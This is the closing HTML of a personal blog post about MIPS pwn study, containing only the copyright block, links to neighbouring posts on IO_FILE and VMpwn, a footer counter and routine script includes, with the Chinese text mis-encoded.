      </script></div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">æœ¬æ–‡ä½œè€…: </span><span class="post-copyright-info"><a href="mailto:undefined">Lock</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">æœ¬æ–‡é“¾æ¥: </span><span class="post-copyright-info"><a href="http://lawlietlw.github.io/2020/08/04/lock-mipspwn-xue-xi/">http://lawlietlw.github.io/2020/08/04/lock-mipspwn-xue-xi/</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="http://LawlietLW.github.io">Lock's blog</a>ï¼</span></div></div></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/LawlietLW.github.io/2020/08/08/io-file-xue-xi/"><i class="fas fa-angle-left">&nbsp;</i><span>IO_FILEå­¦ä¹ </span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/"><span>VMpwnå­¦ä¹ </span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2019 ï½ 2020 By Lock</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/copy.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/highlight.js"></script><!--script(src=url)--></body></html>